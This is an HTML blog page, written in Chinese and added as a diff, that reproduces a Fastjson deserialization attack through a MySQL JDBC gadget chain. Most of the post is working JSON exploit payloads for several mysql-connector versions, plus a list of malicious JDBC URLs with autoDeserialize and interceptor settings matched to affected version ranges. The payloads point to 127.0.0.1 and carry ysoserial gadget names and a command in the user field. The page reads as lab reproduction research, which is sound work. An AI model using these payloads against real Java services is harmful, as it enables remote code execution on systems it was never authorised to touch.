@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=9bd5ca801b57208805a649cd598388a48ca56336">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Fastjson MySQL gadget复现 | BlogPapers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Fastjson MySQL gadget复现" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:4000/2021/Fastjson_Mysql_gadget%E5%A4%8D%E7%8E%B0.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/2021/Fastjson_Mysql_gadget%E5%A4%8D%E7%8E%B0.html" />
+<meta property="og:site_name" content="BlogPapers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Fastjson MySQL gadget复现" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Fastjson MySQL gadget复现","url":"http://0.0.0.0:4000/2021/Fastjson_Mysql_gadget%E5%A4%8D%E7%8E%B0.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>BlogPapers</h1>
+        </a>
+        <h2><a href="sumsec.me"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=24&pause=1000&color=FDFDFD&background=13797800&center=true&vCenter=true&width=435&lines=%F0%9F%91%8B%EF%BC%8C%E5%83%8F%E6%B8%85%E6%B0%B4%E4%B8%80%E8%88%AC%E6%B8%85%E6%BE%88%E9%80%8F%E6%98%8E" alt="SummerSec" /></a></h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/SummerSec/BlogPapers" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h2 id="fastjson-mysql-gadget复现">Fastjson MySQL gadget复现</h2>
+
+<h3 id="漏洞复现">漏洞复现</h3>
+
+<p>payload：<strong>{ "name": { "@type": "java.lang.AutoCloseable", "@type": "com.mysql.jdbc.JDBC4Connection", "hostToConnectTo": "127.0.0.1", "portToConnectTo": 3306, "info": { "user": "yso_CommonsBeanutils1_calc", "password": "pass", "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor", "autoDeserialize": "true", "NUM_HOSTS": "1" }, "databaseToConnectTo": "dbname", "url": "" } }</strong></p>
+
+<p>其中{ "user": "yso_CommonsBeanutils1_calc"是<code class="language-plaintext highlighter-rouge">yso\_是固定（反序列化）CommonsBeanutils1\_（gadget）calc是命令</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        String json2="{ \"name\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"127.0.0.1\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"yso_CommonsBeanutils1_calc\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } }";
+        
+        &lt;dependency&gt;
+            &lt;groupId&gt;mysql&lt;/groupId&gt;
+            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
+            &lt;version&gt;5.1.12&lt;/version&gt;
+        &lt;/dependency&gt;
+
+        
+        String json2="{ \"name\": { \"@type\":\"java.lang.AutoCloseable\", \"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\", \"proxy\": { \"connectionString\":{ \"url\":\"jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;useSSL=false&amp;user=yso_CommonsBeanutils1_calc\" } } }}";
+
+
+        &lt;dependency&gt;
+            &lt;groupId&gt;mysql&lt;/groupId&gt;
+            &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;
+            &lt;version&gt;6.0.2&lt;/version&gt;
+        &lt;/dependency&gt;
+
+
+
+</code></pre></div></div>
+
+<p><img src="https://img.sumsec.me/summersec//6u07er6ec/6u07er6ec.png" alt="image-20211220170706354" /></p>
+
+<p><img src="https://img.sumsec.me/summersec//42u44er42ec/42u44er42ec.png" alt="image-20211220154409962" /></p>
+
+<hr />
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+       </span><span class="nl">"@type"</span><span class="p">:</span><span class="s2">"java.lang.AutoCloseable"</span><span class="p">,</span><span class="w">
+       </span><span class="nl">"@type"</span><span class="p">:</span><span class="s2">"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection"</span><span class="p">,</span><span class="w">
+       </span><span class="nl">"proxy"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+              </span><span class="nl">"@type"</span><span class="p">:</span><span class="s2">"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy"</span><span class="p">,</span><span class="w">
+              </span><span class="nl">"connectionUrl"</span><span class="p">:{</span><span class="w">
+                     </span><span class="nl">"@type"</span><span class="p">:</span><span class="s2">"com.mysql.cj.conf.url.ReplicationConnectionUrl"</span><span class="p">,</span><span class="w">
+                     </span><span class="nl">"masters"</span><span class="p">:[{</span><span class="w">
+                            </span><span class="nl">"host"</span><span class="p">:</span><span class="s2">""</span><span class="w">
+                     </span><span class="p">}],</span><span class="w">
+                     </span><span class="nl">"slaves"</span><span class="p">:[],</span><span class="w">
+                     </span><span class="nl">"properties"</span><span class="p">:{</span><span class="w">
+                            </span><span class="nl">"host"</span><span class="p">:</span><span class="s2">"127.0.0.1"</span><span class="p">,</span><span class="w">
+                            </span><span class="nl">"user"</span><span class="p">:</span><span class="s2">"yso_CommonsCollections4_calc"</span><span class="p">,</span><span class="w">
+                            </span><span class="nl">"dbname"</span><span class="p">:</span><span class="s2">"dbname"</span><span class="p">,</span><span class="w">
+                            </span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"pass"</span><span class="p">,</span><span class="w">
+                            </span><span class="nl">"queryInterceptors"</span><span class="p">:</span><span class="s2">"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"</span><span class="p">,</span><span class="w">
+                            </span><span class="nl">"autoDeserialize"</span><span class="p">:</span><span class="s2">"true"</span><span class="w">
+                     </span><span class="p">}</span><span class="w">
+              </span><span class="p">}</span><span class="w">
+       </span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<hr />
+
+<p>以下是MySQL反序列化漏洞影响的版本，fastjson只能打5.1.11-5.1.48(反序列化链)、6.0.2/6.0.3(反序列化)、8.0.19(反序列化链)（实测）。</p>
+
+<h3 id="影响版本">影响版本</h3>
+
+<h4 id="serverstatusdiffinterceptor触发">ServerStatusDiffInterceptor触发</h4>
+
+<ul>
+  <li><strong>&lt;8.0.20:</strong> <code class="language-plaintext highlighter-rouge">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code></li>
+  <li><strong>6.x(属性名不同):</strong> <code class="language-plaintext highlighter-rouge">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code></li>
+  <li><strong>5.1.11及以上的5.x版本（包名没有了cj）:</strong><code class="language-plaintext highlighter-rouge"> jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</code></li>
+  <li><strong>5.1.10及以下的5.1.X版本：</strong> 同上，但是需要连接后执行查询。</li>
+  <li><strong>5.0.x:</strong> 还没有<code class="language-plaintext highlighter-rouge">ServerStatusDiffInterceptor</code>这个东西┓( ´∀` )┏</li>
+</ul>
+
+<h4 id="detectcustomcollations触发">detectCustomCollations触发：</h4>
+
+<ul>
+  <li><strong>5.1.41及以上:</strong> 不可用</li>
+  <li><strong>5.1.29-5.1.40:</strong> <code class="language-plaintext highlighter-rouge">jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_JRE8u20_calc</code></li>
+  <li><strong>5.1.28-5.1.19：</strong> <code class="language-plaintext highlighter-rouge">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_JRE8u20_calc</code></li>
+  <li><strong>5.1.18以下的5.1.x版本：</strong> 不可用</li>
+  <li><strong>5.0.x版本不可用</strong></li>
+</ul>
+
+<p><img src="https://img.sumsec.me///52u3652ec52u3652ec.png" alt="image-20211220173824621" /></p>
+
+<hr />
+
+<h3 id="参考">参考</h3>
+
+<p>https://www.cnblogs.com/pickmea/p/15157189.html</p>
+
+<p>https://github.com/fnmsd/MySQL_Fake_Server</p>
+
+<p>https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg</p>
+
+      </section>
+    </div>
+  </body>
+</html>
